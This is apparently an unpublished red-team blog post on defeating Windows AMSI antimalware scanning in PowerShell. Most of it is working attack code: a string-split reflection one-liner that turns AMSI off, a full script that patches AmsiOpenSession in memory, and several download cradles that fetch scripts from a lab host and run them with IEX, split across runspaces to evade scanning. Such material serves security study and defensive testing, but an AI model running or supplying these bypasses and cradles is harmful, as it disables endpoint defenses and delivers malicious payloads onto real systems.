---
published: false
---
## Bypassing AMSI like a Script Kiddie

### Introduction

Today I will share some of my findings from playing around with Antimalware
scan Interface (AMSI) on PowerShell.

<!--more-->

While taking Offensive Security's [PEN-300 course](https://www.offensive-security.com/pen300-osep/) leading to the OSEP certificate, I learned a fair bit about developping AMSI bypasses. WinDbg, Frida, Initialization, Patching,... We did it all (see the [syllabus](https://www.offensive-security.com/documentation/PEN300-Syllabus.pdf)).

On the other side, one of my classmates wondered why we bothered with all those techniques when we can just concatenate some strings and not get caught by AMSI.

While I disagree about not learning and understanding the advanced techniques, I'd have to agree with them that AMSI appears to be pretty trivial to bypass.

In this post, we will wear our script kiddie hat and download some AMSI bypass scripts that have been publically available for years. Even though they don't work anymore as is, we won't bother developping whole new ones. We'll just make them work again with barely any modifications and without needing to know what they do or how they work.

Eventually we will fall into a bit of a rabbit hole because a script kiddie can still be curious and learn a little something.

We assume the reader is familiar with AMSI. We also won't be spending too much time explaining how existing bypasses work, as there are plenty of resources out there that do, including some linked here. Getting familiar with the [Windows docs](https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps) is also a good idea.

In this post we will stay in the context of AMSI and PowerShell scripts. Let's start our first full fledged bypass that our script kiddie finds... in a tweet.

### The 140 character bypass

One of the first discovered bypasses was published by Matt Graeber in 2016 and could fit in a [single tweet](https://twitter.com/mattifestation/status/735261120487772160), or 132 characters. It uses reflection to set amsiInitFailed to True, which effectively turns off AMSI.

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Today, the 1-liner gets caught because strings such as 'AmsiUtils' and 'amsiInitFaled' are black listed by AMSI. This turned AMSI bypassing into a bit of a cat and mouse game. [At some point](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/ ), it was possible to adapt this 1-liner just by splitting the blacklisted strings, or switching from single quote to double quotes.

Today, a trivial combination of those two simple ideas still works. Still under 140 characters! An 8 year old hacker could have come up with that.

```
[Ref].Assembly.GetType("System.Management.Automation.Amsi"+"Utils").GetField("amsiInit"+"Failed","NonPublic,Static").SetValue($null,$true)
```

The screenshot below shows a blacklisted keyword getting caught by AMSI, then our one-liner bypass, and the same keyword not getting caught anymore:

[image0]


### AMSIScanBuffer patch

[AMSIScanBuffer](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer) is the Windows API that scans content for malware and returns a result.

If we manage to patch the function, then none of our PowerShell commands will get scanned and we can bypass AMSI.

Rasta Mouse [published](https://rastamouse.me/blog/asb-bypass-pt3/) such a bypass in November 2018 ([source1](https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass.ps1), [source2](https://github.com/webbie321/AmsiScanBufferBypass/blob/master/ASBBypass.ps1)).
Still, wouldn't it be interesting to bypass that capability just because we can? This is our next section with Runspaces.

### Runspaces and Powershell objects (a.k.a. skid learns some PowerShell)

#### Quick intro to Powershell runspaces

"Runspaces are the enclosed area that the thread(s) running PowerShell operate within. While the runspace that is used with the PowerShell console is restricted to a single thread, you can use additional runspaces to allow for use of additional threads" [(source)](https://adamtheautomator.com/powershell-multithreading/#Runspaces_Kinda_Like_Jobs_but_Faster)

In a penetration testing/red teaming context, Powershell runspace  has been used to bypass applocker and CLM constrained language mode
https://www.redteam.cafe/red-team/powershell/powershell-custom-runspace

#### Using runspaces to split AMSI scans into multiple sessions

Here we are not really interested in multithreading, but into the additional control runspaces give us. Our goal is to run individual commands in their own AMSI session, as if we were running them one by one in the Powershell GUI.

Below, we create a runspace instance $Runspace, as well two [powershell instances](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.powershell?view=powershellsdk-7.0.0) $PowerShell1 and $PowerShell2, and link them to that same $Runspace (which needs to be Open)

Powershell instances are commands or scripts that are executed against a Runspace. Once created, we run them individually using the Invoke() method.

```
$Runspace = [runspacefactory]::CreateRunspace().Open()
         
$PowerShell1 = [powershell]::Create()
$PowerShell1.runspace = $Runspace
$PowerShell1.AddScript({$command1}).Invoke();

$PowerShell2 = [powershell]::Create()
$PowerShell2.runspace = $Runspace
$PowerShell2.AddScript({$command2}).Invoke();
```

We show that this allows us to run our commands in separate AMSI sessions. Nice.

[im 12]


Applying this to Rasta Mouse's script, we can adapt our code a bit to shorten things. We reuse a single PowerShell instance and [clear its commands](https://stackoverflow.com/questions/25156868/remove-command-from-powershell-pipeline) each time.

```
$Runspace = [runspacefactory]::CreateRunspace()
$Runspace.Open()
         
$PowerShell = [powershell]::Create()
$PowerShell.runspace = $Runspace
$PowerShell.AddScript({$full = (New-Object Net.Webclient).downloadstring("http://192.168.159.131/rastamouse/full.txt")}).Invoke();

$PowerShell.Commands.Clear()
$PowerShell.AddScript({IEX($full.substring(0,591))}).Invoke();

$PowerShell.Commands.Clear()
$PowerShell.AddScript({IEX($full.substring(591,60))}).Invoke();

$PowerShell.Commands.Clear()
$PowerShell.AddScript({IEX($full.substring(651,126))}).Invoke();
```

We end up with this long “1-liner” which downloads our AMSI bypass script, splits it up, and runs each part in separate AMSI sessions but in the same runspace. Fantastic.

```
$Runspace = [runspacefactory]::CreateRunspace();$Runspace.Open();$PowerShell = [powershell]::Create();$PowerShell.runspace = $Runspace;$PowerShell.AddScript({$full = (New-Object Net.Webclient).downloadstring("http://192.168.159.131/rastamouse/full.txt")}).Invoke();$PowerShell.Commands.Clear() ;$PowerShell.AddScript({IEX($full.substring(0,591))}).Invoke();$PowerShell.Commands.Clear() ;$PowerShell.AddScript({IEX($full.substring(591,60))}).Invoke();$PowerShell.Commands.Clear() ;$PowerShell.AddScript({IEX($full.substring(651,126))}).Invoke();
```

### An actual case where we need separate AMSI sessions

#### Intro

In the last section, we responded to a “what-if” scenario: a case where an Antivirus actually correlates multiple buffers within one AMSI session.

Let's now look at a scenario where the runspace technique is actually needed.

We go back to our original AmsiScanBuffer bypass, which ran Rasta Mouse's script, split in 3 parts (we don't worry about AMSI sessions for now).

```
$full = (New-Object Net.Webclient).downloadstring("http://192.168.159.131/rastamouse/full.txt"); IEX($full.substring(0,591)); IEX($full.substring(591,60)); IEX($full.substring(651,126))
```

Suppose we want to run a second, malicious script, that on its own gets caught by AMSI. We will run it after our bypass, on the same prompt. For our purposes, malicious.txt will just contain the very malicious blacklisted string 'amsiutils' (with the single quotes). We add a download cradle for malicious.txt.

```
$full = (New-Object Net.Webclient).downloadstring("http://192.168.159.131/rastamouse/full.txt"); IEX($full.substring(0,591)); IEX($full.substring(591,60)); IEX($full.substring(651,126)); (New-Object Net.Webclient).downloadstring("http://192.168.159.131/rastamouse/malicious.txt")|IEX
```

It works.

[im 14]


#### AmsiOpenSession patch

Now, let's create a new AMSI bypass script. Instead of patching AmsiScanBuffer, we want to scan AmsiOpenSession. Since we're a script kiddie, we'll just take the [AmsiScanBuffer script](https://github.com/webbie321/AmsiScanBufferBypass/blob/master/ASBBypass.ps1) by Rasta Mouse and replace the function name.


On line 22, we simply replace "Amsi" + "Scan" + "Buffer" by "AmsiOpenSession"

No need to split the string anymore (for now) since this is a less popular function to patch.

Full new script:

```
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiOpenSession")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

We still have to cut the script in 3, but, surprise, it works!

[im16]

We place the script in full2.txt, do a bit of character counting, and we're back to where we were previously. Still works.

```
$full = (New-Object Net.Webclient).downloadstring("http://192.168.159.131/rastamouse/full2.txt"); IEX($full.substring(0,583)); IEX($full.substring(583,60)); IEX($full.substring(643,126))
```

[im17]


We restart PowerShell, and now try to combine this bypass with our malicious script, on the same line, as done earlier:

```
$full = (New-Object Net.Webclient).downloadstring("http://192.168.159.131/rastamouse/full2.txt"); IEX($full.substring(0,583)); IEX($full.substring(583,60)); IEX($full.substring(643,126)); (New-Object Net.Webclient).downloadstring("http://192.168.159.131/rastamouse/malicious.txt")|IEX
```


So what happened here? It looks like the bypass worked, since commands on subsequent prompts don't get caught. However, our “malicious” script that we tried to run on the same prompt as the bypass gets caught.

Remember that the exact same technique applied with an AmsiScanBuffer patch worked fine.

Our problem here is that, although we patched AmsiOpenSession, our malicious command is being run within the same AMSI session as the patch.
A simplified view of what happens behind the scenes is shown below:

```
AmsiOpenSession()

AmsiScanBuffer(1-liner)
AmsiScanBuffer(bypass part 1)
AmsiScanBuffer(bypass part 2)
AmsiScanBuffer(bypass part 3)
AmsiScanBuffer(malicious script)

AmsiCloseSession()
```


We don't run the patched AmsiOpenSession until the next prompt, which explains why the bypass doesn't work for our malicious script but works thereafter.

The solution is to use a Runspace to force a new AMSI session to open. The script below is the same as prior, but using the AmsiOpenSession bypass, and adding our malicious script.

```
$Runspace = [runspacefactory]::CreateRunspace()
$Runspace.Open()
         
$PowerShell = [powershell]::Create()
$PowerShell.runspace = $Runspace
$PowerShell.AddScript({$full = (New-Object Net.Webclient).downloadstring("http://192.168.159.131/rastamouse/full2.txt")}).Invoke();

$PowerShell.Commands.Clear()
$PowerShell.AddScript({IEX($full.substring(0,583))}).Invoke();

$PowerShell.Commands.Clear()
$PowerShell.AddScript({IEX($full.substring(583,60))}).Invoke();

$PowerShell.Commands.Clear()
$PowerShell.AddScript({IEX($full.substring(643,126))}).Invoke();

$PowerShell.Commands.Clear()
$PowerShell.AddScript({(New-Object Net.Webclient).downloadstring("http://192.168.159.131/rastamouse/malicious.txt")|IEX}).Invoke();
```

Let's test it. Very nice!

[image19]


## Conclusion

Our imaginary script kiddie has made a little bit of progress since their time of just modifying a short AMSI bypass tweet.

We demonstrated a script-splitting technique which reduces Windows Defender's ability to make connections between different part of a script.

We also demonstrated a way to bypass what could be a potential future mitigation to the script-splitting technique.

Finally, we showed how to succesfully attack the AmsiOpenSession function, showing how to tackle a significant hurdle in the implementation of a bypass.

I hope other security researchers will find some inspiration to dig further, come up with new ideas, and share with the community. 
